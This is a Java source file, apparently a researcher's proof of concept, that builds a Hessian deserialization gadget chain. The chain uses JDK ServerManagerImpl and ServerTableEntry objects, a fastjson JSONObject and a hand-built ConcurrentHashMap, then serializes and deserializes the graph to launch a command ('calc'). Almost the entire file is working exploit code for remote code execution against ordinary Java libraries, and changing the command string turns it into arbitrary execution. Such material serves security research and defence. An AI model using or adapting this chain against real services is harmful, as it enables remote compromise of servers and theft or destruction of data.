package com.test.gadget;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;

import com.sun.org.apache.xpath.internal.objects.XStringForFSB;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;

import static com.sun.org.apache.xalan.internal.xsltc.compiler.Constants.CHARACTERS;

public class tmp {
    public static void main(String[] args) throws Exception {
        ServerManagerImpl serverManager = createWithObjectNoArgsConstructor(ServerManagerImpl.class);
        HashMap<Integer, ServerTableEntry> map =new HashMap<>();
        ServerTableEntry serverTableEntry = createWithObjectNoArgsConstructor(ServerTableEntry.class);
        map.put(1,serverTableEntry);

        Process process = new ProcessBuilder("cmd", "/c", "calc").start();

        setFieldValue(serverManager, "serverTable", map);
        setFieldValue(serverTableEntry,"state",2);
        setFieldValue(serverTableEntry, "process", process);
        setFieldValue(serverTableEntry, "activationCmd", "calc");

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("key", serverManager);


//        XStringForFSB xStringForFSB = createWithoutConstructor(XStringForFSB.class);
//        setFieldValue(xStringForFSB, "m_strCache", generateRandomString());
        Object conEntry = createWithObjectNoArgsConstructor(Class.forName("javax.sound.sampled.AudioFileFormat$Type"));


        Object conEntry1 = createWithObjectNoArgsConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"));
        Object conEntry2 = createWithObjectNoArgsConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$MapEntry"));
        setFieldValue(conEntry1, "key", conEntry);
        setFieldValue(conEntry1, "val", jsonObject);
        setFieldValue(conEntry2, "key", jsonObject);
        setFieldValue(conEntry2, "val", conEntry);
        ConcurrentHashMap s = new ConcurrentHashMap();
        setFieldValue(s, "sizeCtl", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.concurrent.ConcurrentHashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        setAccessible(nodeCons);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, conEntry1, conEntry1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, conEntry2, conEntry2, null));
        setFieldValue(s, "table", tbl);
        Field table = ConcurrentHashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        table.set(s, tbl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);

        SerializerFactory sf = new SerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);
        out.writeObject(s);
        out.flush();
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        new Hessian2Input(byteArrayInputStream).readObject();
    }

    public static void Serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);

    }

    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException{

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = objectInputStream.readObject();
        return obj;

    }
    public static String generateRandomString() {
        Random random = new Random();
        int length = random.nextInt(20)+1;
        StringBuilder sb = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(CHARACTERS.length());
            char randomChar = CHARACTERS.charAt(index);
            sb.append(randomChar);
        }

        return sb.toString();
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithObjectNoArgsConstructor(Class<T> clzToInstantiate) {

        T resObject = null;
        try{
            resObject = createWithConstructor(clzToInstantiate, Object.class, new Class[0], new Object[0]);
        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {
        }

        return resObject;
    }
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        setAccessible(objCons);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        setAccessible(sc);
        return (T)sc.newInstance(consArgs);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);

        // not possible to quiet runtime warnings anymore...
        // see https://bugs.openjdk.java.net/browse/JDK-8210522
        // to understand impact on Permit (i.e. it does not work
        // anymore with Java >= 12)
        member.setAccessible(true);
    }
}

